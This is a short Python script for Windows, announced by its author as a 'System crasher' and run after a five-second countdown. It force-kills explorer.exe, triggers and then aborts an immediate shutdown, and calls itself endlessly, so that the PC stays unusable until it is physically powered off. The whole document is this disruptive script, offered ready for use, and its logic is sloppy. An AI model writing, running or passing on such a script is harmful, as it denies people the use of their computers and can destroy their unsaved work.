import os
import time
print("System crasher, will fixed if restarted/shutdowned.U will dont be able to use until u close physically.")
print("NOTE AGAIN, IF U WANNA USE AGAIN THE PC, PSYCHICALLY SHUTDOWN PC")
def program():
    os.listvolumes()
    os.listdrives()
    os.system("Taskkill /F /IM explorer.exe")
    os.system("shutdown  /t 0")
    os.system("shutdown /a")
    program()
print("If u dont close, will start in 5 seconds.")
time.sleep(5)

program()

